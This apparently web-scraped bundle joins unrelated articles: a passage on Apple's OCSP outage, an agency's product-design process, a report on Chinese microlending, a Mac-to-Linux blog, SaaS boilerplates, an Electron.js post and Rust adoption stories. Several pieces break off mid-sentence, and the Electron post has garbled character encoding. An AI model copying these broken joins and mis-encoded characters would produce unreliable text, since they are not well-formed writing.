<p>But soft-fail isn’t great, because it means that an attacker with network control can block requests to the responder, and the revocation check will be skipped. In fact, that was the hotfix widely shared on Twitter during this incident: blackhole traffic to “ocsp.apple.com” by adding a line to <em>/etc/hosts</em>. A lot of people won’t be removing that line anytime soon, since disabling OCSP doesn’t cause any noticeable problems.</p>

<h3 id="the-incident">The Incident</h3>

<p>If Apple’s OCSP check was built to soft-fail, then why did apps hang when the OCSP Responder was down? Probably because this was actually a different failure case: the OCSP Responder was not completely down, it was performing badly.</p>

<p>Due to the load added by millions of users worldwide upgrading to macOS “Big Sur”, Apple’s servers slowed to a crawl, and although they weren’t properly answering OCSP queries, they were working just enough that the soft-fail didn’t trigger.</p>

<h3 id="ocsps-privacy-problem">OCSP’s Privacy Problem</h3>

<p>In addition to OCSP’s availability problems, the protocol wasn’t initially designed with privacy in mind. A basic OCSP query involves an unencrypted HTTP request to the OCSP Responder with the serial number of the certificate. Therefore not only can the responder figure out what certificate you are interested in, but so can your ISP and anybody else intercepting packets. Apple could use this to build a timeline of which developers’ apps you are opening, as could third parties.</p>

<p><img src="https://blog.cryptohack.org/assets/images/apple-ocsp-wireshark.jpg?style=centerme" alt="OCSP packet in wireshark"></p>

<p>Adding encryption is possible, and there’s a better, more private version called <a href="https://en.wikipedia.org/wiki/OCSP_stapling">OCSP stapling</a>, but Apple is not using either of these things. In fact OSCP stapling wouldn’t make sense in this scenario, but it illustrates how OCSP needs improvements to not leak data by default.</p>

<h3 id="a-better-future">A Better Future</h3>

<p>This incident has started a lively debate in the software community, with one side proclaiming <a href="https://sneak.berlin/20201112/your-computer-isnt-yours/">“Your Computer Isn’t Yours”</a> and the other arguing that <a href="https://www.security-embedded.com/blog/2020/11/14/application-trust-is-hard-but-apple-does-it-well">“application trust is hard but Apple does it well”</a>. This post aims to show that whichever side you agree with, OCSP is a terrible way to manage certificate revocation, and will lead to more availability and privacy incidents in future. In my opinion, it was a poor engineering decision for Apple to make app launching dependent on OCSP. In the short term at least they have mitigated the damage by <a href="https://lapcatsoftware.com/articles/ocsp.html">increasing the time that responses are cached</a>.</p>

<p>Fortunately, a better revocation method is reaching maturity. CRLite is a way to shrink down lists of all revoked certificates to a reasonable size. <a href="https://scotthelme.co.uk/crlite-finally-a-fix-for-broken-revocation/">Scott Helme’s blog</a> gives a good summary of how CRLite uses Bloom Filters to make the Certificate Revocation List approach – which OCSP superseded – feasible again.</p>

<p>Theoretically, macOS devices could pull updates to this list periodically and do certificate revocation checking on the device itself, addressing the availability and privacy problems with OCSP. On the other hand, since the list of revoked Developer ID certificates is much smaller than the list of all revoked PKI certificates, it’s worth asking why Apple haven’t opted to use CRLs in the first place. Perhaps they don’t want to reveal any information about which certificates they’ve revoked.</p>

<h3 id="conclusion">Conclusion</h3>

<p>Overall, the incident this week was a good time to reflect on the trust model that has been promoted by organisations like Apple and Microsoft. Malware has grown in sophistication and most people aren’t in a position to judge whether it’s safe to run particular binaries. Code signing seems like a neat way to leverage cryptography to determine whether or not to trust applications, and to at least associate apps with known developers. And revocation is a necessary part of maintaining that trust.</p>

<p>However, by adding several mundane failure modes to the verification process, OCSP spoils any cryptographic elegance the code signing and verifying process has. While OCSP is also widely used for TLS certificates on the internet, the large number of PKI certificate authorities and relaxed attitude of browsers means that failures are less catastrophic. Moreover, people are accustomed to seeing websites become unavailable from time to time, but they don’t expect the same from apps on their own devices. macOS users were alarmed at how their apps could become collateral damage for an infrastructure issue at Apple. Yet this was an inevitable outcome arising from the fact that certificate verification depends on external infrastructure, and no infrastructure is 100% reliable.</p>

<p>Scott Helme also has concerns about the power that Certificate Authorities gain when certification revocation actually works effectively. Even if you aren’t bothered about the potential for censorship, there will be occasional mistakes and these must be weighed against the security benefits. As one developer discovered when <a href="https://blog.charliemonroe.net/a-day-without-business/">Apple mistakenly revoked his certificate</a>, …</p></div></article></div></div></div>

Smart and effective product marketing is necessary.</p><p><img src="https://www.miracles.com.hk/wp-content/uploads/2018/11/digital-product-dev-process-Miracle-Digital.jpg" alt="digital product dev process Miracle Digital - Digital product design is the&nbsp;core of Digital Transformation" title="Digital product design is the&nbsp;core of Digital Transformation"></p><h4><b>Step 1 –&nbsp; Research &amp; UX Testing</b></h4><p>The <a href="https://www.miracles.com.hk/web-design-hong-kong/user-experience/">User Experience</a> team will understand the problem that is going to be solved by market and target user research. This part of the project involves meetings with the client or product owners, researching the competitive landscape, performing business analysis and analyzing any data that can be provided by previous iterations analytics.</p><p>When it comes down to a digital product, like a <a href="https://www.miracles.com.hk/web-design-hong-kong/responsive-web-design/">website</a>, it is also important to understand the people using the product, why they are using it and the type of technology they are comfortable with, as this will help the&nbsp;<a href="https://www.miracles.com.hk/web-design-hong-kong/user-experience/">User Experience</a> team define the best answer to the problem’s question.</p><h4><b>Step 2 –&nbsp;</b><b>Prototyping</b></h4><p>Next, <a href="https://www.miracles.com.hk/web-design-hong-kong/user-experience/">User Experience</a> team is responsible for using the information discovered in step one to come up with the best solution to the problem discovered. Generally speaking, this second phase is marked with lots of sketches and initial concepts that can be quickly tested and iterated upon to drive towards the best answer to the problem. <a href="https://www.miracles.com.hk/2018/10/29/why-user-experience-design-is-important/">Wireframing, storyboarding, site-mapping, sketching and whiteboarding</a> are routine elements that make up this phase of the project. A clickable product prototype will deliver to client, product owners or target user group to test the usability of this product.</p><h4><b>Step 3 –&nbsp; Development</b></h4><p>The digital product creation process is the actual building of the application using code, also known as <a href="https://www.miracles.com.hk/web-design-hong-kong/web-development/">development.</a> Here the final designs that were crafted in step three are turned into front-end code (HTML, CSS &amp; JavaScript) and hooked into back-end databases, CMS’s or APIs. Development is also when the actual interaction design is implemented, as well as any transition, effects or loading animations, giving the digital product some life and allowing it to be tested in terms of user delight.</p><h4><b>Step 4 –&nbsp; Testing &amp; QA</b></h4><p>Product software testing practice to test <a href="https://www.miracles.com.hk/app-design-hong-kong/">mobile</a> or <a href="https://www.miracles.com.hk/web-design-hong-kong/">web</a> applications for potential bugs. It’s a complete testing of applications before making live. A digital product needs to be checked completely from end-to-end before it goes live for end users.</p><p>By performing testing, the testing team can make sure that the <a href="https://www.miracles.com.hk/app-design-hong-kong/">mobile</a> or <a href="https://www.miracles.com.hk/web-design-hong-kong/">web</a> system is functioning properly and can be accepted by real-time users. The UI design and functionality are the captains of digital product testing.</p><h4><b>Step 5 – Deploying the Final Product</b></h4><p>The final development step of the process is deployment. Here, the final developed digital product is transitioned from its development environment to the live internet, where it can be accessed by the masses. Generally, this migration is taken care of via the modification of the Domain Name System (DNS), pointing URLs to their correct indexes. This phase can be completed with relative ease, however, a number of situations can arise when moving digital hosting and each deployment should factor in time to allow for bug fixes and code adjustments.</p><h4><b>Step 6 – Maintenance&nbsp;&amp; Optimization</b></h4><p>The final step, optimization, isn’t a typical phase of the digital product production process. This is because Optimization should take place throughout the project and takes a number of different forms. In the initial discovery phase, optimization takes the form of user surveys and interviews to test the assumptions the team is making while performing research. In the second and third steps, it takes the form of prototype user testing, allowing users to interact with wireframes and mockups to test concepts and workflow ideas. In development and deployment, optimization takes the form of quality assurance (QA) testing, making sure to note and quash bugs as they are discovered. Finally, optimization even takes the form of a project post-mortem, analyzing the overall project to see how elements of the process can be improved to provide solid digital solutions in the future.</p><h2>Digital Transformation Agency Miracle</h2><p>We are Digital Transformation Agency Miracle Hong Kong.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>Gu Zeyu’s financial situation hit rock bottom in March. Out of work and owed back pay, the 24-year-old was down to eating one meal a day and struggling to cover her utility bills. But even as she cut her spending to almost nothing, her costs were still overwhelming.&nbsp;</p>



<p>Gu had started borrowing money through Huabei, a popular virtual credit card and microlending service operated by Ant Group, the Chinese financial technology giant, while she was in college. She later signed up for Jiebei and Baitiao, two similar services. Over the next four years, her credit limit which started at around $750, was gradually raised by between $75 and $150 a month. Before she realized it, she had accumulated $4,500 (30,000 yuan) of debt.&nbsp;</p>



<p>“Now, it’s like I’m in a whirlpool,” Gu tells <em>Rest of World</em>. “I can only pay it back slowly, one small sum at a time, and after that, I will have no savings. So the whirlpool makes me keep borrowing more and more.”</p>



<p>Gu’s situation is far from unique. As the Chinese middle class has grown in step with the economy over the past decade, financial technology has allowed hundreds of millions of consumers to borrow money to fuel their spending. Several of these platforms integrate seamlessly into payment and e-commerce platforms, allowing debt to be accumulated almost invisibly. With these services buoying consumer spending, regulators have largely taken a hands-off approach, rarely intervening in the market. But, with the economy slowing down because of the novel coronavirus pandemic, they have become increasingly concerned that the microlending industry could now pose a real risk to the Chinese financial system, should borrowers like Gu start to default en masse.</p>



<p>“These platforms have been really good at democratizing access to financial products and services,” says Zennon Kapron, founder of fintech consultancy Kapronasia. “So on one side, it’s been really good. But on the flip side, it is kind of risky as well.”</p>



<p>In November, these concerns contributed to the 11th-hour suspension of what would have been the world’s largest stock market listing: the $37 billion IPO of Ant Group in Hong Kong and Shanghai.&nbsp;</p>



	




<p>Ant Group, which began as a payment service for the e-commerce platform Alibaba, was a pioneer in the Chinese microlending sector, launching Huabei in 2014 as a way to offer online shoppers access to credit, although it is far from the only player. Hundreds of fintech apps and services are available to Chinese consumers, typically allowing small-scale loans of a few hundred dollars that can be approved and paid in minutes.</p>



<p>Initially, the fintech companies lent their own money, but over the past few years, many have pivoted away from being direct providers of financial products and instead have become platforms for traditional banks and fund managers. Rather than issuing loans to consumers themselves, the fintechs act as brokers, using their own comprehensive internal data to assess a customer’s credit risk, then passing that information on to a bank, which underwrites the loan.</p>



<p>Ant’s IPO filings show that this business, which it calls CreditTech, grew 59% in the first six months of 2020 and now makes up nearly 40% of its total revenues.&nbsp;</p>



<p>This arrangement gave banks access to customers who would previously have been uneconomical to service, customers access to bank loans, and the authorities some assurance that the stable and highly regulated banking sector was involved in the process.&nbsp;</p>



<p>It came as a surprise to some analysts — and fintech companies — when the Chinese government’s new draft fintech regulations, released in November, reversed course. The rules call for fintech companies to originate at least 30% of the loans that go through their platforms, which had previously been less than 5%. To meet that requirement and keep up its current rates of lending, Ant Group would need to find billions of dollars to hold as capital reserves. Its profit margins — the company made $2.6 billion in profit last year — would inevitably narrow.&nbsp;</p>



<p>Several analysts and investors who spoke to <em>Rest of World</em> believe that the numbers revealed by Ant Group’s IPO filing woke regulators up to the extent to which the company has been able to profit from lending out other institutions’ money.</p>



<p>“What changed is that the prospectus highlighted the margins,” says Daniel Broby, director of the Centre for Financial Regulation and Innovation at Strathclyde University. “This is a really impressive company, and you look to see how much money it’s making … and how it’s not sharing the risk of credit issuance, someone, somewhere, clicked.”</p>



<p>There were other factors in the pulling of Ant’s IPO — not least, <a href="https://www.ft.com/content/3d2f174d-aa73-44fc-8c90-45c2a554e97b">an argument between the company’s high-profile founder, Jack Ma</a>, and the regulators. On October 24, at the Bund Summit, an eminent finance forum, <a href="https://www.youtube.com/watch?v=DGzgpArH5AI">Ma publicly complained</a> that regulation would stifle innovation. Many analysts see a direct link between Ma’s implicit criticism of the government and state-backed banks — which he accused of having a “pawnshop mentality” — and the decision to halt the listing. <a href="https://www.wsj.com/articles/china-president-xi-jinping-halted-jack-ma-ant-ipo-11605203556"><em>The Wall Street Journal</em> reported</a> that Chinese President Xi Jinping personally ordered the halt. However, the concerns over financial and social stability are also real.</p>

<p>According to Reuters, <a href="https://www.reuters.com/article/ant-group-ipo-suspension-regulators/how-billionaire-jack-ma-fell-to-earth-and-took-ants-mega-ipo-with-him-idUSKBN27L2GX">a state-compiled report on how Ant Group’s microlending products have encouraged poor people to build up debt</a> was also a factor in suspending the company’s IPO.</p>



<p>Alongside giants like Ant, there are hundreds of other companies — most of them small, and some of them unscrupulous. Some critics of the industry say that the legitimate lenders and the predatory ones feed off one another.&nbsp;</p>



<p>“Because it doesn’t need to meet strict financial requirements, online microlending has evolved into more like a Ponzi scheme,” Shen Yan, an economics professor at Peking University’s National School of Development, tells <em>Rest of World</em>. “For some companies, the ‘better clients’ in their eyes are those who can’t stop borrowing money.”</p>



<p>Li Xiaodong, a 28-year-old in Shanghai, has fallen prey to these lenders. He took his first loan in 2015 from Ant Group’s MYbank lending product to pay rent and start an online store. The business failed, and to pay back the loans, he borrowed more. Today, he owes nearly $59,000 to 13 fintech companies, most backed by Chinese tech giants but some by small, shady businesses. When he was late with payments, some fintech companies publicly shamed him by bombarding Li and his friends, family, and colleagues with calls and text messages asking for money.</p>



<p>“Most people don’t bother to calculate the interest. They just see the advertisement and think, ‘Oh it doesn’t cost much.’” says Li. “People like me, who are bad with numbers, can never understand it.”</p>



<p>The same regulations that hit Ant will also target these smaller players. Under the proposed rules, if a company wants to provide microlending products in more than one of China’s provinces, it will need to have <a href="https://uk.practicallaw.thomsonreuters.com/6-522-0089?transitionType=Default&amp;contextData=(sc.Default)&amp;firstPage=true">registered capital</a> of more than $750 million. Currently, only five companies nationwide have met this threshold, including one owned by Ant Group.&nbsp;</p>



<p>The rules will also force the remaining fintechs to be more prudent when lending, says Shen. “If they operate in a regulated way, they naturally won’t lend to those who shouldn’t be borrowing, because that is a risk, and a risk needs to be covered,” she says. “Your registered capital is here to offset the risks, meaning you will lose your own cash if the borrowers fail to pay you back.”</p>



<p>For those still in the grip of debt, news of stricter regulation was welcome, if a little too late. “The online lenders today have gone down the wrong path,” Li Xiaodong says. “They don’t care at all whether lending you the money is a good thing or bad thing for you. To have the state regulate, that would be good.”</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        <small>2020-11-18</small>
        <p>I’ve been mostly happy using a Mac since I got myself my first computer earned with programmer money. I believe it was a mid 2009 15" MacBook Pro. That was a computer I used at least until 2016 which I consider very decent usable life. At that point I had replaced the hard-drive with an SSD, upgraded the RAM and switched a battery that was worn out. I stopped using it when it just straight died some time in 2016.</p>
<h2 id="my-history-with-the-mac">My history with the Mac</h2>
<p>So what was that computer to me? It was an extremely well-built and solid-feeling piece of aluminium. A cool keyboard backlight. The magsafe charger and a bunch of USB ports. The keyboard and touchpad were best in class. The build quality was better than any laptop I had owned before. Partly because I had only bought the cheap ones before but also because they really were a step above at the time.</p>
<p>I got it primarily on recommendation from a friendly hacker who’s recommendations had never lead me wrong before. He spoke well of the underlying UNIX and the experience of using it. Fast, clean and visually pleasing. I think he mostly really liked the backlit keyboard, very hackerly. His recommendation held true, this computer was very good to me.</p>
<p>I’ve also been the admin on an Xserve server. That was wild. Neat UIs but buggy and finicky as all hell.</p>
<p>Since then I’ve used the second generation Macbook Air (I believe 2nd, first wedge version) at 11". That was a cool little machine and did what it did very nicely.</p>
<p>Hardware aside, MacOS in it’s earlier incarnations on these computers was always a snappy and competent experience. A polished surface which did a bunch of stuff under the hood that generally made it work better than the different Ubuntu desktop environments and various Windows versions I’ve had before. Things like Wifi and even Bluetooth felt good in a way they never had before.</p>
<p>A lot of it was the visual polish and the extremely snappy UI. But in total the experience was just great. Spotlight was glorious. I think my first upgrade was Snow Leopard which was generally a very good update as it focused on performance and stability.</p>
<p>As a developer’s machine it was fast enough, competent enough, got out of the way and the UNIX underpinnings meant I didn’t miss Linux at all. I’ve never been able to really connect with the equivalent powershell stuff in Windows. I guess I just like UNIX.</p>
<p>The only bad thing I can say about my early years of MacBook Pro usage was that the trackpad and the Magic Trackpad I got eventually are probably some of the biggest culprits in some of the RSI-style hand pain I’ve been dealing with. Trackpads are just murder on my hands and I worked loads off of that setup for a number of years. Took a while before I realized that it was trackpad-related.</p>
<p>Beyond that I’ve had some refurb Macs for my wife and assorted family, some 13" MBP for work at one point and then a 15" butterfly touchbar MBP for work. I think that was when I started to feel that Apple was diverging from my preferences in the MBP line.</p>
<h2 id="my-current-experience">My current experience</h2>
<p>That’s the same computer I have and work on now and it is.. fine? Maybe just OK. Not great. I’ve had some keys getting stuck but fixable with canned air. I don’t like the touchbar, it has been between useless and an actual hindrance. The TouchID power button is good though. I don’t like living in dongle-town though I mostly like USB C in the long run.</p>
<p>The reason it has been mostly fine for me is that I keep it on tray mounted on a VESA arm, dangling dongles like a technical octopus and I use external peripherals for input.</p>
<p>It gets really hot and loud and then it performs incredibly poorly. So I guess this is one of the throttliest generations. I think I had the “don’t charge it on the wrong side” problem as well. Some of the CPU shenanigans have calmed down as I installed the Turbo Boost Switcher tool to just disable the Turbo Boost, removing performance for peace and quiet.</p>
<p>As I’ve been using these devices it has become increasingly annoying to figure out how to install “unknown” apps. I need some non-discoverable terminal incantation to get the option to accept installing things that are unsigned. There’s always a new piece getting locked down. And while I think that’s often to the benefit of the average consumer, I’m not that. And I just get more annoyed.</p>
<p>I’ve been frustrated about the uninspiring performance delivered for the incredible brand markup that Apple charges. I don’t mind the computer being expensive if the experience is good and the hardware reasonable. The experience feels like it is slipping, especially for my needs and the hardware has just been getting less impressive to me.</p>
<h2 id="the-hardware">The hardware</h2>
<p>My gaming computer has a Ryzen. For a while I did my dev on that as we had just moved to our house and the office wasn’t finalized. Woof, aside from running Windows as a dev environment which I didn’t enjoy there was some serious upside on that machine.</p>
<p>On the Mac my options are very limited. I can’t get a Ryzen, I can’t get anything modern with Intel or meaningfully upgradable at all. The Mac Pro doesn’t count. It comes underspeced at hilarious prices. I like some of the design decisions but the price-point doesn’t make any kind of sense for me and what I do. I can’t buy an interesting Mac from a performance standpoint.</p>
<p>Or can I? Well, they just announced the M1 chip and ARM Macs are now a fact. I think I might get one at some point. For a travel laptop I don’t think the rest of the industry is ready to fight Apple. Battery life and good bang for buck power might actually keep a Mac in my life for that. But I feel like the general trend is away from what I want. Or I might just use my iPad Pro for that use-case.</p>
<p>I think the M1 will be quite impressive when the benchmarks roll in. I’m sure it will suit many people for real-world use-cases as well. However, from the first presentation on it and the first batch of Macs I don’t feel like the direction is for me. IO was heavily sacrificed. Upgradability is pretty much out the window. These things can be fine for a travel device for me where battery and weight are primary concerns. In that regard the new Air looks pretty good.</p>
<h2 id="the-software">The software</h2>
<p>Beyond that the coming OS, Big Sur, is taking MacOS in a direction I dislike. Catalina was quite messy and felt like it took steps toward walling off the Mac. Big Sur seems even more heavy-handed in that area and finally the M1 can push that even further if Apple feels like it. My trust is eroding on letting Apple set the tone for my computing life.</p>
<p>Don’t get me wrong, I think their approach to this transition is incredibly neat with Rosetta2 and how they are using the bytecode stuff with the App Store and whatnot. And the possibility to run iOS and iPad apps natively could be very useful. But none of this really moves the needle for me.</p>
<h2 id="so-whats-next">So what’s next?</h2>
<p>With my office in the garage as my primary work location I’m looking to transition to a desktop computer with lots of power. It will run Linux. Marking my first major return to desktop linux as a daily driver in a bundle of years. And it will run as light a desktop environment as I can stomach. I just wanted a stupid amount of performance to offset som of the UX niceties I know I will miss or have to customize  on my own.</p>
<p>I’m excited about exercising my development tools on a strong modern CPU rather than the throttled mess my current laptop offers. But I’m not thrilled about this move beyond the hardware aspect. I liked MacOS but I just don’t feel like Apple gives much of a care for the things I care about. And I feel like the software side on the Mac is slipping, consistently.</p>
<p>If they released an expandable Mac that wasn’t ridiculously expensive they would really make me think twice. But that feels unlikely.</p>
<p>So I’ll build myself a monstrous machine that can compensate in raw power for the potential lack of elegance and which offers unbounded flexibility rather than a poorly tended garden that someone keeps trying to wall in.</p>
<p>I’m not happy about it. I’ve generally enjoyed using my Macs. But when someone says “we’ll give you the full experience”, settling into that requires trust. And my trust that Apple and me are in alignment keeps fading.</p>
<p>Also, I’m developing a lot with heavily concurrent workloads. So I really look forward to exercising more cores. 2021, year of the Linux desktop (for me).</p>
<p>If you have thoughts, comments or a hell yeah you want to share about this topic or maybe you want me to cover some specific part of my transition here, let me know either via <a href="mailto:lars@underjord.io">lars@underjord.io</a> or on Twitter <a href="https://twitter.com/lawik">@lawik</a>. My first thoughts and my build might just show up first on my newsletter, so consider signing up for that below. It don’t track. Thanks for reading.</p>

To do that, starting out with a boilerplate/starter kit can save you tons of time. Here is a list of seven boilerplates that could help you build your SaaS faster.</p><hr><h3>Serverless SaaS</h3><p>The <a href="https://serverless.page/">Serverless SaaS</a> boilerplate is the perfect starting point for your next React app. It’s built with TypeScript, Next.js, Tailwind, and Firebase. You can tap into user authentication, payments with Stripe, teams, and more with zero effort.</p><p>Going serverless is a great way of cutting costs because the pay-as-you-go pricing model means you can start free and only pay when your startup gets real traction. You also don’t have to worry about scaling issues. With Serverless platforms you are outsourcing a lot of responsibilities which allows you to move quicker.</p><p>That makes this starter kit great for solo developers and small teams who want to launch something quickly without spending money.</p><img alt="Serverless SaaS logo and slogan" src="https://miro.medium.com/max/700/1*7yHuIcpwIcUBkecK2LORMg.jpeg"><p>Source: <a href="https://serverless.page/">https://serverless.page/</a></p><hr><h3>Jumpstart</h3><p><a href="https://jumpstartrails.com/">Jumpstart</a> is a great starter kit for your next Ruby on Rails app. You can skip the boilerplate set up and build your Rails app faster. It handles all the stuff you need like a user authentication system and even background processing. It also has very good <a href="https://jumpstartrails.com/docs">documentation</a>. You can even try out a <em>lite</em> version that is available for free on <a href="https://github.com/excid3/jumpstart">Github</a>.</p><img alt="Jumpstart home page" src="https://miro.medium.com/max/700/1*8vcaD5txgZRmwqHrxMPvUQ.png"><p>Source: <a href="https://jumpstartrails.com/docs">https://jumpstartrails.com</a></p><hr><h3>Laravel Spark</h3><p><a href="https://spark.laravel.com/">Laravel Spark</a> is a Laravel package that is built by Taylor Otwell, the creator of Laravel. An amazing project to help you build your next great product with PHP. It provides a lot of scaffolding features so you don’t have to code everything yourself. It also has the features that every SaaS business needs, like (two-factor) authentication, subscription billing, and invoices.</p><img alt="Spark logo" src="https://miro.medium.com/max/700/1*OIiJ6wMYQE3XFx48b7NWvw.png"><p>Source: <a href="https://spark.laravel.com/">https://spark.laravel.com/</a></p><hr><h3>Gravity</h3><p>With Gravity, you can build a Node.js and React SaaS app at warp speed. It comes with a lot of features and pre-built components to get you up and running quickly. It even has a built-in user-onboarding flow feedback widget.</p><img alt="Gravity home page" src="https://miro.medium.com/max/700/1*2R71R0rWY_9N8I2wnrAfVA.png"><p>Source: <a href="https://usegravity.app/">https://usegravity.app</a></p><hr><h3>Sjabloon</h3><p><a href="https://www.getsjabloon.com/">Sjabloon</a> is a modern Ruby on Rails SaaS starter kit that also includes all the SaaS features like authentication and payments with Stripe, but also comes with a huge UI components library that is built with Tailwind, the rising CSS framework. This allows you to focus on your core product right from the start. Just like Jumpstart, it also has a lite version that is available for free on <a href="https://github.com/GetSjabloon/sjabloon-lite">Github</a>.</p><img alt="Sjabloon home page" src="https://miro.medium.com/max/700/1*cDQ56JMFLiPsqdiDPmjlkg.png"><p>Source: <a href="https://www.getsjabloon.com/">https://www.getsjabloon.com/</a></p><hr><p>React Milkshake</p><p><a href="https://www.reactmilkshake.com/">React Milkshake</a> is a basic React boilerplate to build high-performance apps faster. It does not come with as many features as the other boilerplates mentioned, but it does come with a code generator that generates components and <a href="https://redux.js.org/">Redux</a> code. If you are using Redux as a state management tool, using this boilerplate will save you a lot of time.</p><img alt="React Milkshake home page" src="https://miro.medium.com/max/700/1*GfuUSjr7h6tkB6YQZqWGEQ.png"><p>Source: <a href="https://www.reactmilkshake.com/">https://www.reactmilkshake.com</a></p><hr><h3>Wave</h3><p>Voyager is a popular Laravel Admin Package and <a href="https://wave.devdojo.com/">Wave</a> is a starter kit built on top of both Laravel and <a href="https://voyager.devdojo.com/">Voyager</a>.

            <div>
                <h3>Why I chose Electron.js for my side business</h3>
                <h4>So I can fry eggs on my MacBook Pro. Kidding ðŸ¥š ðŸ�³</h4>
                

                <p>With the current brouhaha about the Apple M1 chips and the recent <a href="https://www.sketch.com/blog/2020/10/26/part-of-your-world-why-we-re-proud-to-build-a-truly-native-mac-app/">love letter that Sketch wrote about macOS</a> it might seem like choosing Electron.js to develop your idea might be a badâ€¦ idea. But let me tell you why that might not be the case.</p>

                <p>There are several (very good) reasons why Electron.js was the right tech choice for my side business. But to start, hereâ€™s a tweet:</p>

                <p><a href="https://twitter.com/jamonholmgren/status/1105876480930734086?lang=en">
                    <img src="https://getloaf.io/blog/why-i-chose-electronjs/twitter.png">
                </a></p><p>Itâ€™s mostly a funny quip but thereâ€™s truth to it. If I chose to develop Loaf natively, I simply wouldnâ€™t have had the time, money or means to accomplish it. And now that Loaf has paying customers Iâ€™m glad I chose <a href="https://www.electronjs.org/">Electron.js.</a> Hereâ€™s why:</p>

                <h4>1. Money</h4>
                <p><a href="https://getloaf.io/">Loaf</a> is completely bootstrapped. Iâ€™m funding it out of my own wallet so I donâ€™t have the luxury of building a separate macOS app and separate Windows app.</p>

                <h4>2. CSS and layout â�¤ï¸�</h4>
                <p>What does CSS have to do with this? Iâ€™m a web designer and a UI designer. Iâ€™m very comfortable when writing CSS, but have very basic javascript skills. I have non-existent Objective-C/C#/Swift/.NET coding skills.</p>

                <p>Because CSS powers UI layout, it gives me close to ultimate flexibility. This is <b>the dream</b> as a UI designer. I donâ€™t need to ask a developer to make changes, I can do it myself! This means I can craft the best possible user experience. I fuss over every pixel and at the end of the day, the user wins.</p>

                <h4>3. It suits the product!</h4>
                <p>Loaf is an SVG icon editor. So thereâ€™s a natural fit there, the base canvas of an electron app is, essentially, good old HTML. I didn't need to build a rendering engine or do any translation stuff.</p>

                <h4>4. Finding engineers</h4>
                <p>When developing Loaf, I've worked alongside software engineers. The pool of engineers capable of web developement is simply larger than those who specialise in macOS and Windows application development. So finding a suitable partner will be easier for you.</p>

                <p>macOS has been my daily driver for the last 7+ years and I'd love to design macOS software one day. But in the world of business, you have to be practical.</p>

                <p>I wanted to share this in case you were holding out building something neat using Electron.js because it gets bagged out by the cool kids. There's nothing cooler than shipping a product that helps solve a problem for someone in the world.</p>

                <p>What do you think?</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>If you haven’t yet heard, Rust is one of the most promising and <a href="https://insights.stackoverflow.com/survey/2020#most-loved-dreaded-and-wanted">most loved</a> programming languages out there.</p><p>First created at Mozilla, it has since been adopted by companies like Dropbox, Microsoft, Facebook, and others. Rust’s main benefit is that it enables C-like performance while still keeping the memory safety that we are used to when developing with languages like JavaScript and Python.</p><p>In this article, I will look at nine large companies that use Rust and delve into the reasons for their choice.</p><h2 id="9-rust-success-stories">9 Rust success stories</h2><h3 id="dropbox">Dropbox</h3><p><img src="https://serokell.io/files/4b/4b69p1dn.dropbox_(1).jpg" alt="Dropbox uses Rust" loading="lazy"></p><p><a href="https://www.dropbox.com/">Dropbox</a> uses Rust for parts of its file synchronization engine. Since the engine is highly concurrent, writing, testing, and debugging it is hard. Therefore, the team chose to rewrite it in Rust. Rust’s static types and heavy compile-time checks give it an advantage over dynamically typed languages like Python when you need to tackle complex codebases and concurrent code.</p><blockquote>
<p>Rust has been a force multiplier for our team, and betting on Rust was one of the best decisions we made. More than performance, its ergonomics and focus on correctness has helped us tame sync’s complexity. We can encode complex invariants about our system in the type system and have the compiler check them for us. <a href="https://dropbox.tech/infrastructure/rewriting-the-heart-of-our-sync-engine">(Source)</a></p>
</blockquote><p>Read more about Dropbox’s use of Rust <a href="https://dropbox.tech/infrastructure/rewriting-the-heart-of-our-sync-engine">on their tech blog</a>.</p><h3 id="coursera">Coursera</h3><p><a href="https://www.coursera.org/">Coursera</a> uses Rust for their programming assignments feature where students need to write and run a computer program to solve a problem. The programs are run, tested, and graded inside Docker containers. For security reasons, the developer team needed to use a low-level language like Rust for some of the code, and they decided that Rust is more secure than C.</p><blockquote>
<p>Although C is the default low-level full-control programming language, these binaries have strict security and correctness requirements. We instead have chosen Rust, a modern native language from Mozilla. One of Rust’s common selling points is complete immunity to certain classes of security vulnerabilities thanks to its powerful type system, making it an excellent choice for security critical functions. <a href="https://medium.com/coursera-engineering/rust-docker-in-production-coursera-f7841d88e6ed">(Source)</a></p>
</blockquote><p>You can get more details on their use of Rust for programming assignments <a href="https://medium.com/coursera-engineering/rust-docker-in-production-coursera-f7841d88e6ed">on their blog</a>.</p><h3 id="figma">Figma</h3><p><img src="https://serokell.io/files/ru/rucki4yw.figma_(1).jpg" alt="Figma uses Rust" loading="lazy"></p><p><a href="https://www.figma.com/">Figma</a> is a collaborative web-based design tool for vector graphics and interface prototyping. They chose to rewrite their multiplayer syncing engine in Rust (previously, it was in TypeScript) to improve performance since their server couldn’t keep up with user growth.</p><blockquote>
<p>We chose Rust for this rewrite because it combines best-in-class speed with low resource usage while still offering the safety of standard server languages. Low resource usage was particularly important to us because some of the performance issues with the old server were caused by the garbage collector. <a href="https://www.figma.com/blog/rust-in-production-at-figma/">(Source)</a></p>
</blockquote><p>Find out more about Figma’s use of Rust <a href="https://www.figma.com/blog/rust-in-production-at-figma/">on their blog</a>.</p><h3 id="npm">npm</h3><p><a href="https://www.npmjs.com/">npm</a> is a package manager for JavaScript. Its engineering team chose to rewrite their main service in Rust because they saw that the service’s performance would soon be a bottleneck if user growth kept up. They rejected technologies such as C and C++ since they didn’t trust themselves to be able to handle memory management for a web-exposed service. Java was rejected since it would involve deploying JVM on their servers. 🙃</p><blockquote>
<p>The challenges that npm faces demand efficient and scalable solutions. When a service can be deploy-and-forget, that saves valuable operations time and lets them focus on other issues. npm employees also value having a helpful community around any technology they use. Rust fits all these criteria and is currently in use as part of npm’s stack. <a href="https://www.rust-lang.org/static/pdfs/Rust-npm-Whitepaper.pdf">(Source)</a></p>
